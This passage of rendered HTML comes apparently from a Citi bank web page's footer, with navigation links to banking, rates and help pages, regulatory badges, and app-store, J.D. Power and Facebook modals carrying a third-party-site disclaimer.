                                                            <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="3d9d875e-8905-a4e6-999d-c4220ca570e0_ariadescription">Opens in new window</span>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navSpecialOffers" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="17c4767e-2987-baee-b5f2-4c82aba33656"
                                                                href="https://online.citi.com/US/JRS/portal/template.do?ID=SpecialOffers"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Special Offers
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ytb-c194="" role="group" class="section ng-star-inserted">
                                                <div _ngcontent-ytb-c194="" class="title ng-star-inserted" id="nav-list-header1">Wealth Management</div>
                                                <button _ngcontent-ytb-c194="" type="button" class="title ng-star-inserted" aria-controls="list1" aria-expanded="false">Wealth Management</button>
                                                <ul _ngcontent-ytb-c194="" id="list1" aria-labelledby="nav-list-header1" aria-hidden="false" class="ng-star-inserted">
                                                    <li _ngcontent-ytb-c194="" id="navCitiPrivateClient" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" id="e9ef652b-3af6-6d07-d806-f0a3840cf067" class="btn btn-link ng-star-inserted" href="https://online.citi.com/US/ag/citigold-private-client">
                                                                Citigold<sup>®</sup> Private Client
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCitigold" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="87eef141-c672-c31a-56ef-b74ce2badf56"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=CitigoldOverview"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Citigold
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCitiPriority" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="1af1ba73-b8d9-bb3f-31ee-b19f5f2a8d60"
                                                                href="https://online.citi.com/US/JRS/pands/detail.do?ID=CitiPriorityOverview"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Citi Priority
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCitiPrivateBank" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" target="_self" id="6f3022fa-935d-0122-c59e-2c33b47817a9" href="https://www.privatebank.citibank.com/" class="btn btn-link ng-star-inserted">
                                                                Citi Private Bank
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ytb-c194="" role="group" class="section ng-star-inserted">
                                                <div _ngcontent-ytb-c194="" class="title ng-star-inserted" id="nav-list-header2">Business Banking</div>
                                                <button _ngcontent-ytb-c194="" type="button" class="title ng-star-inserted" aria-controls="list2" aria-expanded="false">Business Banking</button>
                                                <ul _ngcontent-ytb-c194="" id="list2" aria-labelledby="nav-list-header2" aria-hidden="false" class="ng-star-inserted">
                                                    <li _ngcontent-ytb-c194="" id="navSmallBusinessAccounts" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" id="52e504b0-43b5-ccd9-2726-18dcc99ca5a1" class="btn btn-link ng-star-inserted" href="https://online.citi.com/US/ag/small-business-banking">
                                                                Small Business Accounts
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCommercialAccounts" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="ea011077-ec31-b4cf-e210-a3964bfef968"
                                                                href="https://www.citibank.com/commercialbank/en/index.html"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Commercial Accounts
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ytb-c194="" role="group" class="section ng-star-inserted">
                                                <div _ngcontent-ytb-c194="" class="title ng-star-inserted" id="nav-list-header3">Rates</div>
                                                <button _ngcontent-ytb-c194="" type="button" class="title ng-star-inserted" aria-controls="list3" aria-expanded="false">Rates</button>
                                                <ul _ngcontent-ytb-c194="" id="list3" aria-labelledby="nav-list-header3" aria-hidden="false" class="ng-star-inserted">
                                                    <li _ngcontent-ytb-c194="" id="navPersonal Banking" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                id="eef66ff6-30b5-af1c-02fe-577677205535"
                                                                class="btn btn-link ng-star-inserted"
                                                                href="https://online.citi.com/US/ag/current-interest-rates/checking-saving-accounts"
                                                            >
                                                                Personal Banking
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navCreditCards" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="9300726d-2574-8ea4-97b3-81d4fc446f89"
                                                                href="https://www.citi.com/credit-cards/compare-credit-cards/citi.action?ID=view-all-credit-cards"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Credit Cards
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navMortgage" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="22b7b33b-95a1-1e39-b739-f63bb3188434"
                                                                href="https://online.citi.com/US/JRS/portal/template.do?ID=todays_mortgage_rates&amp;type=buy"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Mortgage
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navHomeEquity" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                target="_self"
                                                                id="f974f258-e3d6-926f-3385-15b97123372c"
                                                                href="https://online.citi.com/US/JRS/portal/template.do?ID=home_equity_rates"
                                                                class="btn btn-link ng-star-inserted"
                                                            >
                                                                Home Equity
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navLending" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a
                                                                _ngcontent-ytb-c46=""
                                                                id="ac0ce84c-8934-11ba-dd8d-9ca33d6b0f92"
                                                                class="btn btn-link ng-star-inserted"
                                                                href="https://online.citi.com/US/ag/current-interest-rates/personal-loans-and-lines-of-credit"
                                                            >
                                                                Lending
                                                            </a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ytb-c194="" role="group" class="last section ng-star-inserted">
                                                <div _ngcontent-ytb-c194="" class="title ng-star-inserted" id="nav-list-header4">Help &amp; Support</div>
                                                <button _ngcontent-ytb-c194="" type="button" class="title ng-star-inserted" aria-controls="list4" aria-expanded="false">Help &amp; Support</button>
                                                <ul _ngcontent-ytb-c194="" id="list4" aria-labelledby="nav-list-header4" aria-hidden="false" class="ng-star-inserted">
                                                    <li _ngcontent-ytb-c194="" id="navContactUs" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" id="441ddd00-ae2c-d675-3efd-cfaf03f1ff14" class="btn btn-link ng-star-inserted" href="https://online.citi.com/US/ag/contactus">Contact Us</a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navHelpFAQs" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" id="45bc55ce-0631-cd35-34d5-e3ca48d09ec5" class="btn btn-link ng-star-inserted" href="https://online.citi.com/US/ag/helptopic">Help &amp; FAQs</a>
                                                        </citi-cta>
                                                    </li>
                                                    <li _ngcontent-ytb-c194="" id="navSecurityCenter" class="ng-star-inserted">
                                                        <citi-cta _ngcontent-ytb-c194="" type="tertiary" _nghost-ytb-c46="" class="ng-star-inserted">
                                                            <a _ngcontent-ytb-c46="" id="9973ccf7-2513-6e2c-864e-aee0157ac44c" class="btn btn-link ng-star-inserted" href="https://online.citi.com/US/ag/security-center">Security Center</a>
                                                        </citi-cta>
                                                    </li>
                                                </ul>
                                            </div>
                                            <div _ngcontent-ytb-c194="" class="section">
                                                <div _ngcontent-ytb-c194="" class="images ng-star-inserted">
                                                    <div _ngcontent-ytb-c194="" class="ng-star-inserted">
                                                        <span _ngcontent-ytb-c194="" id="fdicSprite" role="img" aria-label="Member FDIC" alt="Member FDIC" class="brandingSprite fdic"></span>
                                                    </div>
                                                    <div _ngcontent-ytb-c194="" class="ng-star-inserted">
                                                        <span _ngcontent-ytb-c194="" id="homeSprite" role="img" aria-label="Equal housing lender" alt="Equal housing lender" class="brandingSprite equalHousing"></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </citi-footer-navigation>
                                <citi-social-media _ngcontent-ytb-c193="" _nghost-ytb-c197="">
                                    <div _ngcontent-ytb-c197="" class="social ng-star-inserted">
                                        <div _ngcontent-ytb-c197="" class="content">
                                            <div _ngcontent-ytb-c197="" class="socialItems ng-star-inserted">
                                                <div _ngcontent-ytb-c197="" class="ng-star-inserted">
                                                    <button _ngcontent-ytb-c197="" data-target="#modal00" aria-label="Get it on Google Play" class="citi-branding-assets/images/googlePlay@3x.png ng-star-inserted">
                                                        <div _ngcontent-ytb-c197="" class="Googleplay"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal00">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ytb-c197="">
                                                                                        You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security
                                                                                        than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go
                                                                                        to the third party site? <br />
                                                                                        <br />
                                                                                        Citi is not responsible for the products, services or facilities provided and/or owned by other companies.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <a
                                                                                            _ngcontent-ytb-c46=""
                                                                                            target="_blank"
                                                                                            id="8d6a92fd-af2c-0803-bd2a-6b3e61dc4e57"
                                                                                            href="https://play.google.com/store/apps/details?id=com.citi.citimobile"
                                                                                            aria-describedby="63c21bca-03bf-f3b9-87cf-1e238a02cf1f_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="63c21bca-03bf-f3b9-87cf-1e238a02cf1f_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ytb-c197="" class="ng-star-inserted">
                                                    <button _ngcontent-ytb-c197="" data-target="#modal01" aria-label="Download on the App Store" class="citi-branding-assets/images/appStore@3x.png ng-star-inserted">
                                                        <div _ngcontent-ytb-c197="" class="Appstore"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal01">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ytb-c197="">
                                                                                        You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security
                                                                                        than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go
                                                                                        to the third party site? <br />
                                                                                        <br />
                                                                                        Citi is not responsible for the products, services or facilities provided and/or owned by other companies.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <a
                                                                                            _ngcontent-ytb-c46=""
                                                                                            target="_blank"
                                                                                            id="54fa2a02-1e0d-65d5-a24b-64f99a3febe2"
                                                                                            href="https://itunes.apple.com/app/citi-mobile-sm/id301724680?mt=8"
                                                                                            aria-describedby="c3f5a7ca-fbd1-a3b5-4558-ef60f1097ee3_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="c3f5a7ca-fbd1-a3b5-4558-ef60f1097ee3_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                                <div _ngcontent-ytb-c197="" class="ng-star-inserted">
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="" class="ng-star-inserted">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="JDPower-0">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted">
                                                                                    <div _ngcontent-ytb-c197="" title="">J.D. Power 2019 Mobile App Certification Program&amp;#8480;&lt;span class='sr-only'&gt;Service Mark&lt;/span&gt;</div>
                                                                                </div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ytb-c197="">
                                                                                        J.D. Power 2019 Mobile App Certification Program℠<span class="sr-only">Service Mark</span> recognition is based on successful completion of an audit and
                                                                                        exceeding a customer experience benchmark through a survey of recent servicing interactions. For more information, visit
                                                                                    </p>
                                                                                    <a _ngcontent-ytb-c197="" class="ng-star-inserted">jdpower.com/awards</a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <button
                                                                                            _ngcontent-ytb-c46=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="d4556423-c6d4-3b0c-9979-fa21c090f8bd"
                                                                                            role="button"
                                                                                            aria-describedby="b03619c0-d70d-eccc-4a32-dfd9a02dfcb2_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </button>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="b03619c0-d70d-eccc-4a32-dfd9a02dfcb2_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="" class="ng-star-inserted">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="JDPower-1">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <p _ngcontent-ytb-c197="">
                                                                                        You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less security
                                                                                        than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you want to go
                                                                                        to the third party site? <br />
                                                                                        <br />
                                                                                        Citi is not responsible for the products, services or facilities provided and/or owned by other companies.
                                                                                    </p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <a
                                                                                            _ngcontent-ytb-c46=""
                                                                                            target="_blank"
                                                                                            id="db4b26de-c324-4305-db18-592504807fc4"
                                                                                            href="http://www.jdpower.com/awards"
                                                                                            aria-describedby="9eaf385f-0f58-d860-ad89-a6b5d200a1fd_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="9eaf385f-0f58-d860-ad89-a6b5d200a1fd_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal02">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title=""></div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1"><p _ngcontent-ytb-c197=""></p></div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <button
                                                                                            _ngcontent-ytb-c46=""
                                                                                            style="text-align: center;"
                                                                                            type="button"
                                                                                            id="5493b47f-d333-e24d-6b4c-6f92a5588c8e"
                                                                                            role="button"
                                                                                            aria-describedby="5c64d75a-d132-9f96-30de-a08083490caa_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </button>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="5c64d75a-d132-9f96-30de-a08083490caa_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                </div>
                                                            </div>
                                                            <div _ngcontent-ytb-c53="" class="modal-backdrop citi-modal-backdrop fade" style="display: none;"></div>
                                                        </div>
                                                    </citi-modal>
                                                </div>
                                            </div>
                                            <div _ngcontent-ytb-c197="" class="socialItems ng-star-inserted"></div>
                                            <div _ngcontent-ytb-c197="" class="socialItems ng-star-inserted">
                                                <div _ngcontent-ytb-c197="" class="ng-star-inserted">
                                                    <button _ngcontent-ytb-c197="" data-target="#modal20" aria-label="facebook" class="citi-branding-assets/images/social-media_facebook@3x.png ng-star-inserted">
                                                        <div _ngcontent-ytb-c197="" class="facebook"></div>
                                                    </button>
                                                    <citi-modal _ngcontent-ytb-c197="" primarybuttontarget="_blank" _nghost-ytb-c53="">
                                                        <div _ngcontent-ytb-c53="" ddlariahideouterdom="">
                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal citi-modal fade" style="display: none;" id="modal20">
                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-dialog">
                                                                    <div tabindex="0" class="cdk-visually-hidden cdk-focus-trap-anchor" aria-hidden="true"></div>
                                                                    <div _ngcontent-ytb-c53="" cdktrapfocus="" class="modal-content">
                                                                        <div _ngcontent-ytb-c53="" class="modal-header">
                                                                            <button _ngcontent-ytb-c53="" type="button" aria-label="Close modal" class="close-button ng-star-inserted">
                                                                                <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only">Close</span>
                                                                            </button>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" role="document">
                                                                            <div _ngcontent-ytb-c53="" tabindex="-1" class="modal-body">
                                                                                <div _ngcontent-ytb-c53="" tabindex="-1" class="header ng-star-inserted"><div _ngcontent-ytb-c197="" title="">Important Information</div></div>
                                                                                <div _ngcontent-ytb-c53="" class="modal-body-content" tabindex="-1">
                                                                                    <spannn _ngcontent-ytb-c197="">
                                                                                        <p>
                                                                                            You are leaving a Citi Website and going to a third party site. That site may have a privacy policy different from Citi and may provide less
                                                                                            security than this Citi site. Citi and its affiliates are not responsible for the products, services, and content on the third party website. Do you
                                                                                            want to go to the third party site?
                                                                                        </p>
                                                                                        <p>Citi is not responsible for the products, services or facilities provided and/or owned by other companies.</p>
                                                                                    </spannn>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div _ngcontent-ytb-c53="" class="modal-footer">
                                                                            <div _ngcontent-ytb-c53="" class="text-right ng-star-inserted">
                                                                                <div _ngcontent-ytb-c53="" class="citi-modal-controls ng-star-inserted">
                                                                                    <citi-cta _ngcontent-ytb-c53="" class="modal-primary-btn btnclassTest ng-star-inserted" _nghost-ytb-c46="">
                                                                                        <a
                                                                                            _ngcontent-ytb-c46=""
                                                                                            target="_blank"
                                                                                            id="6f7b0507-e845-45f3-d6dd-28b19d4f5c76"
                                                                                            href="https://www.facebook.com/citibank"
                                                                                            aria-describedby="a6b04719-1dd9-3795-9abf-05824b34cfe2_ariadescription"
                                                                                            class="btn btn-primary ng-star-inserted"
                                                                                        >
                                                                                            Continue
                                                                                        </a>
                                                                                        <span _ngcontent-ytb-c46="" aria-hidden="true" class="sr-only ng-star-inserted" id="a6b04719-1dd9-3795-9abf-05824b34cfe2_ariadescription">
                                                                                            Opens in new window
                                                                                        </span>
                                                                                    </citi-cta>
                                                                                    <span _ngcontent-ytb-c53="" aria-hidden="false" class="sr-only"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
